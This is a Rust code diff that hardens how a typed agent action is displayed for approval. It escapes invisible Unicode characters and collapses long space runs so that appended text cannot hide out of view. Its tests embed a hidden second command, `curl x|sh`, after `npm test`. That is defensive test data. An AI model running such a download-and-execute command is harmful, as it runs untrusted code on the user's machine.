@@ -14,6 +14,8 @@
 //! can show it and offer all three answers. Daemons that ask say
 //! [`DaemonFeatures::DRIVE_ASKS`](crate::DaemonFeatures::DRIVE_ASKS).
 
+use std::fmt::Write as _;
+
 use serde::{Deserialize, Serialize};
 
 use crate::ids::{OptionId, PaneId, RequestId, UnixMillis};
@@ -115,8 +117,9 @@ impl DriveAction {
         }
     }
 
-    /// The action exactly, in words. Control characters show as `^X`, line breaks as `⏎`
-    /// and invisible formatting as `<U+…>`, so nothing typed can hide from the reader.
+    /// The action exactly, in words. Control characters show as `^X`, line breaks as `⏎`,
+    /// separators, odd spaces, blanks and invisible formatting as `<U+…>` and long runs of
+    /// spaces as `<N spaces>`, so nothing typed can hide from the reader.
     pub fn describe(&self) -> String {
         match self {
             Self::Type { text, keys, submit } => {
@@ -143,10 +146,23 @@ impl DriveAction {
     }
 }
 
-/// `text` with every character that could hide or reorder what is shown made visible.
+/// Spaces in a row from which a run shows as `<N spaces>`: enough to push the rest of a line
+/// out of a card's view, never what a command needs to read as typed.
+const LONG_SPACE_RUN: usize = 4;
+
+/// `text` with every character that could hide or reorder what is shown made visible: line and
+/// paragraph separators, spaces other than U+0020, fillers and blanks as `<U+…>`, and long runs
+/// of spaces as `<N spaces>`.
 pub(crate) fn visible(text: &str) -> String {
     let mut shown = String::with_capacity(text.len());
+    let mut spaces = 0;
     for ch in text.chars() {
+        if ch == ' ' {
+            spaces += 1;
+            continue;
+        }
+        push_spaces(&mut shown, spaces);
+        spaces = 0;
         match ch {
             '\n' | '\r' => shown.push('⏎'),
             '\t' => shown.push('⇥'),
@@ -155,15 +171,38 @@ pub(crate) fn visible(text: &str) -> String {
                 shown.push(char::from(ch as u8 + b'@'));
             }
             '\u{7f}' => shown.push_str("^?"),
-            '\u{80}'..='\u{9f}'
-            | '\u{200b}'..='\u{200f}'
-            | '\u{202a}'..='\u{202e}'
-            | '\u{2060}'..='\u{2069}'
-            | '\u{feff}' => shown.push_str(&format!("<U+{:04X}>", ch as u32)),
+            ch if is_hidden(ch) => {
+                let _ = write!(shown, "<U+{:04X}>", ch as u32);
+            }
             ch => shown.push(ch),
         }
     }
+    push_spaces(&mut shown, spaces);
     shown
+}
+
+fn push_spaces(shown: &mut String, count: usize) {
+    if count >= LONG_SPACE_RUN {
+        let _ = write!(shown, "<{count} spaces>");
+    } else {
+        shown.extend(std::iter::repeat_n(' ', count));
+    }
+}
+
+/// C1 controls, separators, spaces that are not U+0020, blanks and invisible format marks.
+fn is_hidden(ch: char) -> bool {
+    matches!(
+        ch,
+        '\u{80}'..='\u{9f}'
+            | '\u{a0}'
+            | '\u{1680}'
+            | '\u{2000}'..='\u{200a}'
+            | '\u{2028}'..='\u{2029}'
+            | '\u{202f}'
+            | '\u{205f}'
+            | '\u{2800}'
+            | '\u{3000}'
+    ) || crate::is_invisible_format(ch)
 }
 
 /// A drive request opened or closed ([`ApprovalPush::Drive`](crate::ApprovalPush::Drive)).
@@ -173,4 +212,46 @@ pub enum DrivePush {
     Open(DriveAsk),
     /// A request was answered, expired or withdrawn.
     Closed { request_id: RequestId },
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn long_space_runs_cannot_push_the_rest_of_a_command_out_of_view() {
+        let command = format!("npm test{}; curl x|sh", " ".repeat(300));
+        assert_eq!(visible(&command), "npm test<300 spaces>; curl x|sh");
+        assert_eq!(visible("a   b"), "a   b");
+        assert_eq!(visible("trailing    "), "trailing<4 spaces>");
+    }
+
+    #[test]
+    fn separators_odd_spaces_fillers_and_blanks_are_escaped() {
+        for (hidden, shown) in [
+            ('\u{2028}', "<U+2028>"),
+            ('\u{2029}', "<U+2029>"),
+            ('\u{00a0}', "<U+00A0>"),
+            ('\u{1680}', "<U+1680>"),
+            ('\u{2003}', "<U+2003>"),
+            ('\u{202f}', "<U+202F>"),
+            ('\u{205f}', "<U+205F>"),
+            ('\u{3000}', "<U+3000>"),
+            ('\u{3164}', "<U+3164>"),
+            ('\u{2800}', "<U+2800>"),
+            ('\u{115f}', "<U+115F>"),
+            ('\u{ffa0}', "<U+FFA0>"),
+            ('\u{00ad}', "<U+00AD>"),
+            ('\u{e0041}', "<U+E0041>"),
+            ('\u{fe0f}', "<U+FE0F>"),
+        ] {
+            assert_eq!(
+                visible(&format!("npm test{hidden}; curl x|sh")),
+                format!("npm test{shown}; curl x|sh"),
+                "{:04X}",
+                hidden as u32
+            );
+        }
+        assert_eq!(visible("ls -la ~/é"), "ls -la ~/é");
+    }
 }
